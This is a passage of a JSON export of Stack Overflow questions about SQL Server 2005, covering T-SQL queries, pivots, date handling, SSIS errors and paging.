a lot of complaints by the users on the floor who are working with this report for most of their daily tasks.</p>\n\n<p>The report is basically one table which is returning multiple results based on the parameters given and the data returned by the Stored procedure. The sort functionality is achieved by setting the user sort on the table header for each column. </p>\n\n<p>Any help would be appreciated.</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","data","sqlclient"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":96,"score":2,"question_id":12201943,"title":"SqlDbType.Date SQL Server 2005","body":"<p>I have a property like this:</p>\n\n<pre><code>private SqlParameter DateOfBirthSqlParameter\n{\n    get\n    {\n        return new SqlParameter(\"@date\", SqlDbType.Date)\n            {\n                Value = dateOfBirth.ToString(\"MM/dd/yyyy\");\n            };\n    }\n}\n</code></pre>\n\n<p><code>dateOfBirth</code> is a <code>DataTime</code> C# type. I use this parameter to add to my SQL command, that look like this.</p>\n\n<pre><code>Select * From mytable Where dob_dt = @date\n</code></pre>\n\n<p>The problem is that doesn't work in SQL Server 2005. I got an exception: </p>\n\n<blockquote>\n  <p><em>System.ArgumentException: The version of SQL Server in use does not\n  support datatype 'date'</em></p>\n</blockquote>\n\n<p>This because SQL Server 2005 doesn't support <code>Date</code>, this is a feature of later version (SQL Server <strong>2008</strong>). </p>\n\n<p>There are many solutions to this, for instance change <code>SqlDbType.Date</code> to <code>SqlDbType.DateTime</code></p>\n\n<p>I guess the reference <code>System.Data</code> is a version that provide all features supported for SQL Server 2008. Should I change it to something that only support 2005? that will help to discover other possible mismatches? What is the best way to handle this situation?</p>\n\n<p>Thanks.</p>\n\n<p><strong>Update: 8/31/2012</strong></p>\n\n<p>In the example, I used date of birth but In my application I used something else such as purchase_dt or something like it (with the time on it). My first Select Statement was:</p>\n\n<pre><code>Select * From mytable Where Cast(purchase_dt as Date) = @date\n</code></pre>\n\n<p>and that was fine in my computer with SQL Server <strong>2008</strong> and in another PC with SQL Server <strong>2005</strong> also was fine and just throws an exception when it got to the select. </p>\n\n<p>But, once I fixed that, with:</p>\n\n<pre><code>Select * From mytable Where Cast(DATEDIFF(dd, 0, purchase_dt) as DateTime) = @date\n</code></pre>\n\n<p>This broke the entire web application (in the other PC)... The problem was <code>SqlDbType.Date</code>. but Why it didn't break it before?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":28,"score":-2,"question_id":12961115,"title":"TVF doesn't give any data","body":"<p>I have one table valued function. It gives no data when executed. But when I execute only the query of that table valued function by giving the same parameter, then I get the data. Why is this?</p>\n\n<p>I am executing TVF as follows:</p>\n\n<pre><code>select *\n  from fn_name(param1,param2,param3)\n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12959713,"title":"SQL Server 2005 alter multiple indexes on single database","body":"<p>On production database in my environment, there are over 2000+ indexes that need to be maintained. There are particular high traffic indexes that become fragmented within the week. </p>\n\n<p>For nightly maintenance jobs can concurrent alter index statement be ran on multiple tables within the same database? </p>\n\n<p>I would like to know the pros and cons of this setup.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":59,"score":0,"question_id":12959435,"title":"Cannot be divided by zero in SQL Error","body":"<p>I am wondering if there is a way to not use the division if the divisor = 0. In this case, i have the query working fine except when it has to be divided by 0. It should give the answer as 0 if the divisor is 0.Is it possible? This is in SQl 2005.</p>\n\n<p>Thanks!</p>\n\n<pre><code>Select sum(cast(isnull(S.AmountSold, 0) as numeric(10,2))) As DeliveryTotal,\nsum(cast(isnull(S.S_AmountCollected, 0) as numeric(10,2))) as DeliveryTotalCollected\n(sum(cast(isnull(S.S_AmountCollected, 0) as numeric(10,2))) / sum(cast(isnull(S.AmountSold, 0) as numeric(10,2))) )*100 as DeliveryTotalPercentageCollected\n\nfrom Info RD\n</code></pre>\n"},{"tags":["java","sql-server-2005","mybatis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":55,"score":-1,"question_id":12958597,"title":"100% memory usage on sql server and 100% cpu usage un java batch application for stored procedure","body":"<p>we have a batch java program based on mybatis for data access , running on server 1, which purpose is to print some informations returned by a stored procedure of sql server 2005 running on server 2. We have found that stored procedure uses nearly the 100% memory of server 2, this is due to a bad implmentation of the procedure which contains a lot of nested cursors and we are triyng to change and optimize it. The weird problem is the java application which uses 100% cpu when started. Could it be connected to the above procedure ? after the sp has returned it's values a file gets filled with them. What would happen if the file gets opened before the call of to the procedure , i mean could it be involved in  the high cpu using ? Anyway anybody could provide us any good hint about what to investigate ?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12958072,"title":"Get Sum of all Distinct in a week","body":"<p>I am wondering where exactly i am not clear with this query. I want to get the count of all distinct RepIDs that worked in a particular week. This is In SQL Server 2005. Thank you!!</p>\n\n<p>This query gives me distinct RepID's for the whole week. I want to count RepID twice if he has records on 2 different days but count only once even if he has more than 1 record for any partiular day.. I hope i am clear. I am sorry that i was not clear before! Thank you!</p>\n\n<pre><code>Select count(distinct(RepID)) as SalesPeople from DailyInfo\nwhere Date &gt; DATEADD(dd, -(DATEPART(dw, @Date)-1), @Date) \n     and Date &lt; DATEADD(dd, 7-(DATEPART(dw, @Date)), @Date)\n</code></pre>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-job"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":120,"score":2,"question_id":11986611,"title":"What do the Categories in SQL Server Agent Jobs mean?","body":"<p>This is the first time I am trying for the <strong>SQL Job Agent</strong>...I was <strong>trying to create the sample job</strong> and I got struck in between when it came to select the <strong>Category as highlighted</strong> in the below screen shot</p>\n\n<p><img src=\"http://i.stack.imgur.com/nTYYg.png\" alt=\"enter image description here\"></p>\n\n<p>I am new to <strong>SQL Server</strong> can you explain the meanings of categories as mentioned above? or any link will be hightly appreciated.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":3398,"score":4,"question_id":428458,"title":"Counting rows for all tables at once","body":"<p>I'm using SQL Server 2005 and would like to know how I can get a list of all tables with the number of records in each.</p>\n\n<p>I know I can get a list of tables using the <code>sys.tables</code> view, but I'm unable to find the count.</p>\n\n<p>Thank you</p>\n"},{"tags":["sql-server","sql-server-2005","ssis","ibm-midrange","bids"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":98,"score":2,"question_id":12935483,"title":"SSIS: Just started getting a \"Key not valid for use in specified state.\" error on my sheduled SSIS package","body":"<p>I have 2 scheduled jobs on my SQL Server 2005 machine that are scheduled to run each morning (around 2:00 AM).  These jobs have worked fine (mostly) for years and although I've had a few hiccups that I've had to work through this problem is completely stumping me.</p>\n\n<p>Two mornings ago, one of my packages started reporting the following error:</p>\n\n<pre><code>Executed as user: [Service Acount]. ...n 9.00.4035.00 for 32-bit\nCopyright (C) Microsoft Corp 1984-2005. All rights reserved.\n     Started:  1:15:01 AM  Error: 2012-10-17 01:15:03.98\n     Code: 0xC0016016\n     Source:\n       Description: Failed to decrypt protected XML node \"DTS:Password\" \n       with error 0x8009000B \"Key not valid for use in specified state.\". \n       You may not be authorized to access this information. This error \n       occurs when there is a cryptographic error. Verify that the \n       correct key is available.  End Error  Error: 2012-10-17 01:15:03.99\n     Code: 0xC0016016\n     Source:\n       Description: Failed to decrypt protected XML node \"DTS:Password\" \n       with error 0x8009000B \"Key not valid for use in specified state.\". \n       You may not be authorized to access this information. This error \n       occurs when there is a cryptographic error. Verify that the \n       correct key is available.  End Error  Error: 2012-10-17 01:15:04.01\n     Code: 0xC0016016     \nSource:       \nDescription: Failed to ...  The package execution fa...  The step failed.\n</code></pre>\n\n<p>This appears to be a common problem, however, none of the recommendations that I've found either apply to my scenario nor does my instance seem to match most of the other cases where this occurs.  Here are the important details regarding my implementation.</p>\n\n<ul>\n<li>This package is exporting data from an iSeries system, to SQL Server\n2005 data tables. </li>\n<li>This process works successfully but keeps crashing\non one, specific table export.  In fact, it runs without any trouble\nfor over 2 hours before it dies.  After inspecting all properties associated\nwith this step, I can see that there is nothing different about this step \ncompared to the other table export steps, other than the table/column export \nmappings.</li>\n<li>The package <code>ProtectionLevel</code> is set to <code>DontSaveSensitive</code> and the iSeries \ncredentials are stored in a config file that is accessed by SQL Server. </li>\n<li>I can execute the failing step on my machine, in BIDS. Regardless, it doesn't \nwork on the server, though the server is using the exact same credentials.</li>\n<li>As I mentioned, I have two packages.  They are effectively the same thing, except \none is exporting the data from one iSeries database, and the other is exporting \ndata that is almost the exact same structure from another iSeries DB.  The first \npackage doesn't have any trouble even though it is using the same iSeries credentials.</li>\n<li>To be clear, nothing on my server has changed in months (that I am aware of.)  This \njust started happening yesterday morning.</li>\n</ul>\n\n<p>Any tips, or thoughts would be tremendously helpful.  This export is extremely important and many users/worker rely on this data for their day-to-day work.  Thank you.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","highcharts"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":97,"score":2,"question_id":12954824,"title":"Sql query to populate 0's for missing data","body":"<p>To populate a stacked and grouped highchart I need to add some 0 values into my data. I've tried with a numbers table but could not figure out how to add 0's for every empoloyee missing per date. So I have:</p>\n\n<p>TABLE (Datum, Employee, Number, Stack)</p>\n\n<pre><code>2012-10-13 00:00:00.000 Nick    3   corporate\n2012-10-14 00:00:00.000 Jack    1   private\n2012-10-15 00:00:00.000 Yannick 1   corporate\n2012-10-15 00:00:00.000 Jack    2   corporate\n</code></pre>\n\n<p>and I need:</p>\n\n<pre><code>2012-10-13 00:00:00.000 Nick    3   corporate\n2012-10-14 00:00:00.000 Nick    0   corporate\n2012-10-15 00:00:00.000 Nick    0   corporate\n2012-10-13 00:00:00.000 Jack    0   private\n2012-10-14 00:00:00.000 Jack    1   private\n2012-10-15 00:00:00.000 Jack    0   private\n2012-10-13 00:00:00.000 Yannick 0   corporate\n2012-10-14 00:00:00.000 Yannick 0   corporate\n2012-10-15 00:00:00.000 Yannick 1   corporate\n2012-10-13 00:00:00.000 Jack    0   corporate\n2012-10-14 00:00:00.000 Jack    0   corporate\n2012-10-15 00:00:00.000 Jack    2   corporate\n</code></pre>\n\n<p>do I need to use a cursor or is there a better trick?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12954781,"title":"Refactoring T-SQL nested SELECT query to use in a case statement","body":"<p>I have the following table:</p>\n\n<pre><code>maker   model   type\nB   1121    pc\nA   1233    pc\nE   1260    pc\nA   1752    laptop\nA   1276    printer\nD   1288    printer\n</code></pre>\n\n<p>I need to receive a result in the form: maker, pc. If a particular maker has models in a given type, I need to concatenate the word 'yes' with the number of models in parentheses. Ex. yes(1) for maker 'A'. So, how can I avoid the following duplication?</p>\n\n<pre><code>CASE \nWHEN SELECT COUNT(*) WHERE ... &gt; 0\nTHEN 'yes(' + CAST((SELECT COUNT(*) WHERE ...) AS varchar) + ')'\n</code></pre>\n\n<p>This is not a real world problem. I just need to understand how to save a subquery result to use it in a branch statement. The result of this branch statement may contain the subquery result itself.</p>\n"}]}
{"total":14387,"page":4,"pagesize":100,"questions":[{"tags":["sql","sql-server-2005","paging"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12953197,"title":"sql query limit by amount of values in a column","body":"<p>I work on a SQL Server 2005, where I have two tables, like this:</p>\n\n<p><em>Table1</em></p>\n\n<pre><code>ID (Guid) Primarykey\nsomething1 (string)\nsomething2 (string)\n</code></pre>\n\n<p>And</p>\n\n<p><em>Table2</em></p>\n\n<pre><code>ID (Guid) Primarykey\nTable1ID (Guid) is a ForeignKey to Table1\nOrderNr (int)\nsomething1 (string)\nsomething2 (string)\n</code></pre>\n\n<p>Now I have to do a select query (which gives me hundreds of results), basically something like: <code>SELECT * from Table2 where something1 = 'foo' order by Table1ID, OrderNr</code></p>\n\n<p>Specially the order by is important, I can't change that. And the statement is in real much more complicated with a lot of joins, subselects and wheres and so on, but they are not needed here...</p>\n\n<p>My problem is, that I need a special paging: Just select all the rows with the 20 different Table1IDs starting from ID 10 to ID 15. (That means <strong>I want a paging, but not on rowcount but on this columns unique values</strong>)</p>\n\n<p>If I had a nested select or a function call which adds the iterated number of the selectstatement i could use a between, but how can I count the unique ids and add it to the query up there?</p>\n\n<p>Thank you for your help, Karl</p>\n"},{"tags":["sql-server-2005","subquery"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12951931,"title":"Fetch monthly records by total and by detail from single query in SQL Server 2005","body":"<p>I am working with SQL Server 2005.</p>\n\n<p>I want to fetch <code>monthlyTotalAppoinment</code> and <code>monthlyEmployeewiseTotal</code> from <code>appointment</code> table in single result.</p>\n\n<p><strong>Appointment Table</strong> </p>\n\n<pre><code>appoinmentId\nappoinmentDate\nemployeeId\n</code></pre>\n\n<p>I can successfully fetch <code>monthlyTotalAppoinment</code> and also got <code>employeewisetotaappoinment</code> from following query, but I want monthly <code>employeewiseappoinment</code>.</p>\n\n<pre><code>SELECT * \n  FROM (SELECT Datename(M, Dateadd(M, NUMBER - 1, 0)) AS month \n          FROM MASTER..SPT_VALUES \n         WHERE TYPE = 'p' \n               AND NUMBER BETWEEN 1 AND 12) months \n       LEFT JOIN (SELECT Datename(MM, APPOINMENTDATE) month, \n                         Count(APPOINMENTID)          AS TotalAppointment \n                    FROM APPOINTMENT \n                   GROUP BY Datename(MM, APPOINMENTDATE)) appoinment \n              ON months.MONTH = appoinment.MONTH \n</code></pre>\n\n<p>I am getting following output.</p>\n\n<p><img src=\"http://i.stack.imgur.com/gkAas.png\" alt=\"enter image description here\"></p>\n\n<p>but I want following output</p>\n\n<p><img src=\"http://i.stack.imgur.com/2b72q.png\" alt=\"enter image description here\"></p>\n\n<pre><code>   appoinementId   employeeId   appoinemntDate  \n   -------------  -----------   ---------------\n    1                 4         8/25/2012 12:00:00 AM\n    2                 4         8/25/2012 12:00:00 AM\n    3                 4         8/25/2012 12:00:00 AM\n    4                 4         8/25/2012 12:00:00 AM\n    5                 4         8/25/2012 12:00:00 AM\n    6                 4         9/25/2012 12:00:00 AM\n    7                 2         9/25/2012 12:00:00 AM\n    8                 2         9/25/2012 12:00:00 AM\n    9                 2         9/25/2012 12:00:00 AM\n    10                4         9/25/2012 12:00:00 AM\n    11                4         10/25/2012 12:00:00 AM\n    12                2         10/25/2012 12:00:00 AM\n    13                4         10/25/2012 12:00:00 AM\n</code></pre>\n\n<p>for above data cuming output(For EmployeeId 4)</p>\n\n<pre><code>   Month           MonthData   Totalappoinemnt TotalEmployeewiseAppointmemt  \n   -------------  -----------   -------------- ------------------------------\n     January..      NULL..       NULL..          NULL..\n     Augest         Augest         5             9\n     September      September      5             9\n     October        October        3             9      \n</code></pre>\n\n<p>But i want following</p>\n\n<pre><code>     Month           MonthData   Totalappoinemnt TotalEmployeewiseAppointmemt  \n   -------------  -----------   -------------- ------------------------------\n    January..      NULL..       NULL..          NULL..\n     Augest         Augest         5             5\n     September      September      5             2\n     October        October        3             2       \n</code></pre>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12936006,"title":"How do I concatenate numbers to create a custom date?","body":"<p>Here is what I have tried thus far:</p>\n\n<pre><code>select CAST(\n    DATEPART(month,getDate())+'-'+\n    DATEPART(day,getDate())+'-'+\n    2012\n    as datetime)\n</code></pre>\n\n<p>I end up with the date: 1905-08-02 00:00:00.0. I was expecting to get today's date. I have rearranged the order and it doesn't seem to change. Can anyone offer as to why it gives me this? For the record, I plan to use other values than 2012 for the year.\nThanks in advance.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":510,"score":4,"question_id":3751782,"title":"SQL Server 2005, Calculating upcoming birthdays from date of birth","body":"<p>This one has bugged me for a while now. Recently when revisiting some code I wrote for a customer a few years ago I was wondering if there is a more elegant solution to the problem.</p>\n\n<p>The customer stores all of their clients information including date of birth (date time field)</p>\n\n<p>They run an extract every Monday that retrieves any customer whose birthday will fall within the following week.</p>\n\n<p>I.e. if the extract was run on Monday Jan 1st, Customers whose birthday fell between (and including) Monday Jan 8th -> Sunday Jan 14th would be retrieved.</p>\n\n<p>My solution was to use the Datepart(dy) function and calculate all upcoming birthdays based off the customers date of birth converted to day of year, adding some logic to include for the extract being run at the end of a year.\nThe problem was that using Day of year throws results off by 1 day if the customer was born on a leap year and / or the extract is run on a leap-year after the 29th of Feb, so once again I had to add more logic so the procedure returned the expected results.</p>\n\n<p>This seemed quite over-kill for what should be a simple task\nFor simplicity lets say the table 'customer' contains 4 fields, first name, last name, dob, and address.</p>\n\n<p>Any suggestions on how to simplify this would really be appreciated</p>\n\n<p>Wes</p>\n"},{"tags":["sql-server-2005"],"answer_count":4,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":2423,"score":2,"question_id":1486332,"title":"Get comma separated value from multiple row in sql server 2005","body":"<p>i have this table</p>\n\n<blockquote>\n<pre><code>Cream\n----------\nCHOCALATE\nGREEN\nTEST\n</code></pre>\n</blockquote>\n\n<p>want out put in select query like this</p>\n\n<h2>cream</h2>\n\n<p>CHOCALATE,GREEN,TEST</p>\n"},{"tags":["sql-server-2005","recursion"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12939593,"title":"Recursively get data from a query result in SQL","body":"<p>SQL gurus</p>\n\n<p>I have a table structure as follows </p>\n\n<pre><code>Id        Name        IdPartner\nId1       name1           \nId2       Name2       Id1\nId3       name3       Id1\nId4       name4       Id2\nId5       name5       Id3\n</code></pre>\n\n<p>I need to write a query that would recursively loop through the table to find the partners. </p>\n\n<p>I.e Given an Id say Id1 here, I need to pull out all the Names where Id1 is listed as a partner, So my query need to pull up Name3 and Name2. Subsequently in the same query I also need to pull the names where Name3 and Name2 are also listed as partners. So in this case if I give the input to the SP as Id1 I should effectively get a list that read as below </p>\n\n<pre><code>   Id          Name\n  Id2         name2\n  Id3         name3\n  Id4         name4\n  Id5         name5\n</code></pre>\n\n<p>I havent worked with recursively getting the data in SQL. Someone told me I could use a common table expression, but I fail to see how that would help me. I have been breaking my head over this for over a day and all I can come up with is the idea of using a cursor.</p>\n\n<p>Any help in this regard helps</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12914888,"title":"need to use ROW_NUMBER without over in sqlserver 2005","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12914499/row-number-without-over-in-sql\">ROW_NUMBER() without over in SQL</a>  </p>\n</blockquote>\n\n\n\n<p>I have a grid with sorting on each column and have to show only 50 rows at a time.</p>\n\n<p>I am using sql server 2005 as database. </p>\n\n<p>Now there is ROW_NUMBER function in sql server 2005 to filter the data with row number but <code>Over(order by [Column])</code> is mandatory to use. In my case I have to sort my grid with different columns so I can not use the static columns name in order by clause. The restriction is , I have to use static query.</p>\n\n<p>Can you guys help me out on this problem?</p>\n"},{"tags":["database","query","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12914499,"title":"ROW_NUMBER() without over in SQL","body":"<p>Is there any way to use <code>ROW_NUMBER()</code> in SQL without using <code>OVER</code>, because I want to use sorting. </p>\n\n<p>I have a Grid with multiple sortable columns with configurable rows. In my scenario order by is variable that's why I am not able to put order by using ROWNUM.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":60,"score":1,"question_id":12932045,"title":"Cross Join without duplicate combinations","body":"<p>I know this question is very similar to this one:\n<a href=\"http://stackoverflow.com/questions/12490244/symmetric-cross-join\">Symmetric cross join</a>\nand this one too:\n<a href=\"http://stackoverflow.com/questions/7112513/combinations-not-permutations-from-cross-join-in-sql\">combinations (not permutations) from cross join in sql</a></p>\n\n<p>But what about if we have two different tables, say A and B:</p>\n\n<pre><code>select A.id,B.id from A cross join B\n</code></pre>\n\n<p>but I want to consider the pair <code>(a,b)</code> equal to <code>(b,a)</code></p>\n"},{"tags":["sql","sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12617753,"title":"Pass SSIS variable to Process task","body":"<p>How to pass variables defined in SSIS as parameters to SSIS Process task that runs a bat file.</p>\n\n<p>In the bat file the user name and password would be replaced with %1 argument and input will be passed from the script task that will receive input from a .NET front-end.</p>\n\n<p>Please do help with screenshots if possible</p>\n\n<p><img src=\"http://i.stack.imgur.com/4axbV.png\" alt=\"enter image description here\"></p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12947743,"title":"Retreive data column wise in sqlserver","body":"<p>I have a problem where  i need to display subject names(ex- english,science ....)  of student as columns  and under each subject their respective marks . i  query a database and  get these values as rows in dataset not as columns.How should i query the database</p>\n\n<p>my query result</p>\n\n<pre><code>student name | marks  | Subectname\n\nraghuram        78         english\n\nraghuram        34         physics\n\nraghuram        76         chemistry\n</code></pre>\n\n<p>................              ...         ..........</p>\n\n<pre><code>Required Result  in Report\n\nstudentname | english | Maths | physics | ......\n\nraghuram        78       66        32\n</code></pre>\n\n<p>Heres my query</p>\n\n<pre><code>Select st.FirstName+' '+st.LastName as StudentName,s.Subject_Name,se.Mark from   dbo.FEE_STUDENT_EXAM se\ninner join dbo.FEE_STUDENT_GRADE sg on sg.Student_ID=se.Student_ID\ninner join FEE_STUDENT st on st.Student_ID=sg.Student_ID\ninner join dbo.EMP_SUBJECT s on s.SubjectID=se.Subject_ID\nwhere sg.Grade_ID=@GradeId and sg.Division_ID=@DivId and\nse.Subject_ID in(Select  d.SubjectId from dbo.FEE_STUDENT_EXAM_SCHEDULED d inner join \ndbo.FEE_STUDENT_EXAM_SCHEDULEH h on h.ExamScheduleID=d.ExamScheduleID where \nh.Grade_Id=@GradeId and h.Division_ID=@DivId and year(cast (d.TestDate as datetime))=@Year\nand month(cast (d.TestDate as datetime))=@Month)\n</code></pre>\n"},{"tags":["vb.net","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12946904,"title":"Switch between connection string at runtime","body":"<p>I need to switch between some databases at the same time (using VB.net). As far as I know, I must create some connection Strings and use them in different conditions.</p>\n\n<p>For example </p>\n\n<pre><code>If ( condition )  then \n  use connection String 1\nelseif (condition)  then \n  use connection String 2 \nend if \n</code></pre>\n\n<p>Can anyone help me how to handle this?\nI'm using MSSQL 2005 and VB.net </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12947045,"title":"How to copy the table with values from one database to another database table?","body":"<p>I Create the table <strong>abc under test</strong> database.And I create <strong>bcd table under test1</strong>.The bcd,abc table fields are same.abc table have the data. Now,<strong>How to copy the abc table values to bcd table in sql server 2005</strong>?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2926,"score":1,"question_id":6071883,"title":"Conversion failed when converting the nvarchar value '' to data type int","body":"<p>While this may sound like a beginner 101 problem I think it is a bit more complicated.</p>\n\n<p>I have two instances of SQL server, one is a log-shipped read/only standby copy of the master database that is used for reporting purposes.</p>\n\n<p>They are both 64-bit SQL 2005, SP3.</p>\n\n<p>The LogShipped Instance is: 9.00.4035.00 (Standard Edition)\nThe Original Instance is: 9.00.4035.00 (Enterprise Edition) in an Active / Passive Cluster.</p>\n\n<p>Server collation is Latin1_General_CI_AI on both and they both run on Server 2003 64 bit.</p>\n\n<p>I have a query that runs and executes fine on the master database server but it fails on the standby / read-only copy with a conversion of nvarchar to int.</p>\n\n<p>The code is identical and i've copied and pasted it from the main instance query window just to double check.</p>\n\n<p>Is there a bug in SQL server somewhere? I can paste the query if needed (its a bog-standard select with some in-line tables)</p>\n\n<p>Just don't understand why it works on the one yet the log-shipped copy fails.</p>\n\n<p>Any pointers is much appreciated.</p>\n\n<p>-- Edit</p>\n\n<p>I have found the culprit.. the transaction log database contains invalid data that isn't in the primary database.. quite why they are out of sych I do not know yet as the transaction log shipping is still working and I have no errors in the job-history.</p>\n\n<p>Just a few orphaned records that are invalid that are not in the primary db.. how odd</p>\n"},{"tags":["sql","sql-server","sql-server-2005","csv","bulkinsert"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12945610,"title":"How to import CSV to SQL Server 2005 w/o BCP?","body":"<p>I am working on a ColdFusion (feel free to laugh) 8 site that that is hosted in a shared environment. The database and the web server are separate boxes. We don't have root access to either, and we don't have \"exec xp_cmdshell\" permission. SQL Server version is 2005. </p>\n\n<p>So, what is the closest equivalent to BULK INSERT that we should try if we would like to efficiently import a CSV or other text file into the database--but without BCP or \"format files\"? </p>\n\n<p>Obviously, we could just build a massive INSERT statement in ColdFusion, with UNION ALLs for each row, and run that. But is that the best option? Your thoughts?</p>\n"},{"tags":["sql","sql-server-2005","datetime"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12921907,"title":"Update a whole column based on 2 columns of a different table","body":"<p>I added a new column to a table. The columns of the table are:</p>\n\n<pre><code>Identifier(unique identity but not joinable to the other table)\nClinicalID(int)\nsenttime(datetime)\norgID(int-new column)\n</code></pre>\n\n<p>I need to update the new column from a different table based on the sent time. \nI should check on what date range the sent time falls and update the orgID accordingly.\nColumns of the other table:</p>\n\n<pre><code>ClinicalIDentifier\norg ID(int) \nold orgID(int)\neffectivefromtime\neffectivethrutime\n</code></pre>\n\n<p>The issue I am facing is that if the senttime is > effective fromtime of the other table, it displayes the other org IDs of the same ClinicalID where the  senttime is > effective fromtime.</p>\n\n<p>I am stuck at comparing date ranges. </p>\n\n<p>Please let me know if you require any further information</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12944094,"title":"pivot to total per week","body":"<p>I have a query that i am trying to write to return the amount of times and instance occurs in a database and group by week and product as defined by the database. below is my query:</p>\n\n<pre><code>SELECT WeekCompleted, Product, COUNT(OrderNumber) as CorrectionCount FROM(\nSELECT \np.Abbreviation as Product\n,CAST(oi.OrderID as VARCHAR(MAX))+'.'+CAST(oi.OrderItemID as VARCHAR(MAX)) AS OrderNumber\n,CASE\n    WHEN o.ClientID IN (56156, 56394) \n        THEN DATEADD(week, datepart(ww, dbo.GetLatestMilestoneDate(oi.OrderID, oi.OrderItemID, 80)) \n            - 1, DATEADD(DAY, @@datefirst - DATEPART(weekday, CAST(YEAR(GETDATE()) AS VARCHAR)\n            + '-01-01') - 6, CAST(YEAR(GETDATE()) AS VARCHAR) + '-01-01'))\n    ELSE DATEADD(week, datepart(ww, dbo.GetLatestMilestoneDate(oi.OrderID, oi.OrderItemID, 130)) \n    - 1, DATEADD(DAY, @@datefirst - DATEPART(weekday, CAST(YEAR(GETDATE()) AS VARCHAR)\n    + '-01-01') - 6, CAST(YEAR(GETDATE()) AS VARCHAR) + '-01-01')) \n    END AS WeekCompleted\n,CASE   \n    WHEN o.ClientID IN (56156,56394) THEN dbo.GetLatestMilestoneDate(oi.OrderID, oi.OrderItemID, 80)\n    ELSE dbo.GetLatestMilestoneDate(oi.OrderID, oi.OrderItemID, 130) END AS LastCompleted\nFROM\nOrderItems oi\nLEFT JOIN OrderItemMilestones oim on oim.OrderID = oi.OrderID and oim.OrderItemID = oi.OrderItemID\nJOIN Products p on p.ProductID = oi.ProductID\nJOIN Orders o on o.OrderID = oi.OrderID\nWHERE\noim.MilestoneID = 90\nand QueueID = 0\n) src\nWHERE LastCompleted &gt;= '2012-10-01'\nGROUP BY WeekCompleted, Product\n</code></pre>\n\n<p>here is more info needed</p>\n\n<pre><code> dbo.getlatestmilestonedate() returns a datetime date in this format: mm:dd:yyyy hh:mm:ss\n</code></pre>\n\n<p>and a sample table of data i currently have:</p>\n\n<pre><code>WeekCompleted           Product    CorrectionCount\n2012-09-30 00:00:00.000 Product1    5\n2012-10-07 00:00:00.000 Product1    7\n2012-10-14 00:00:00.000 Product1    7\n2012-09-30 00:00:00.000 Product2    18\n2012-10-07 00:00:00.000 Product2    28\n2012-10-14 00:00:00.000 Product2    16\n</code></pre>\n\n<p>This data is returning exactly how i want it to so no change is needed to the original data unless needed to accomplish final goal, which is this:</p>\n\n<pre><code>WeekCompleted               Product1        Product2\n2012-09-30 00:00:00.000      5                18\n2012-10-07 00:00:00.000      7                28 \n2012-10-14 00:00:00.000      7                16\n</code></pre>\n\n<p>I think i need to pivot this, but every time i try i only run into syntax errors and dont quite yet understand the pivot 